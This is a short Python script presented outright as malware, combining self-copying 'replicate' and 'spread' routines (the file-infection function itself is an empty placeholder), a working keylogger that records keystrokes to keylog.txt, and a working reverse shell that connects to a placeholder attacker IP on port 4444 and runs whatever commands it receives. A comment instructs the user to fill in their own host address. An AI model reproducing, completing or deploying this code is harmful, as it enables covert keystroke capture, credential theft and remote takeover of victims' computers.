import os
import shutil
import keyboard
import logging
import socket
import subprocess

def infect_file(file_path):
    # Your malicious code to infect the file goes here
    pass

def replicate():
    # Select a directory to infect files
    target_directory = "C:\example\program File"

    # List all files in the target directory
    files = os.listdir(target_directory)

    # Iterate through the files and infect them
    for file in files:
        file_path = os.path.join(target_directory, file)

        # Make sure it's a file and not a directory
        if os.path.isfile(file_path):
            infect_file(file_path)

def spread():
    # Select a directory to copy the malware to
    destination_directory = "C:\example\program File"

    # Copy the malware to the destination directory
    shutil.copy2(__file__, destination_directory)

def start_keylogger():
    # Set up logging configuration
    logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s %(message)s')

    # Define the callback function for key events
    def callback(event):
        logging.info(event.name)

    # Start the keylogger
    keyboard.on_release(callback=callback)

# Change the attacker port and ip address with your host machine ip address
def establish_reverse_shell():
    # Attacker's IP address and port
    attacker_ip = "x.x.x.x"
    attacker_port = 4444

    # Create a socket and connect to the attacker's machine
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))

    # Execute a shell command and send the output to the attacker
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())

    # Close the socket
    s.close()

# Main execution
if __name__ == "__main__":
    replicate()
    spread()
    start_keylogger()
    establish_reverse_shell()
